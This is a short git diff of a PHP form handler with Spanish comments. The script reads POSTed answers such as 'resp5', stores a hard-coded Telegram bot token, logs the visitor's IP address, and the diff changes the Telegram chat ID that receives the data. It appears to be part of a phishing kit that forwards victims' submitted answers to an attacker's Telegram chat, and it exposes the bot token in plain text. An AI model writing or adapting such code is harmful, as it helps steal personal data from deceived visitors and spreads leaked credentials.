@@ -13,7 +13,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 	$resp5 = $_POST["resp5"];
 	
   $botToken = "8857815714:AAFp5JutGMJPmwrZf5NwiigjazGNVbnJEB4"; // Reemplaza con tu token de bot
-    $chatID = "8857815714"; // Reemplaza con tu chat ID
+    $chatID = "8555745789"; // Reemplaza con tu chat ID
 
     // Obtén la IP del cliente
     $ip = $_SERVER['REMOTE_ADDR'];
